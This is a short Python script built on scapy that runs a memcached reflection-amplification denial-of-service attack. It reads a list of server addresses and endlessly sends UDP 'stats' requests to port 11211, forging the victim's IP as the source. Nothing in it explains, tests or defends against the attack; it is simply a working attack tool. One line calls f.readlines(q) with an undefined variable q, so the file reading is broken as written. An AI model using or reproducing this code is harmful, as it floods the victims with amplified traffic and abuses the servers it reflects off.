from scapy.all import IP, UDP, Raw, send
import os
import time
os.system("cls")

target = input("Target: ")

with open('ips.txt', 'r') as f:
        ips = f.readlines(q)

payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
while True:
    for ip in ips:
        send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)
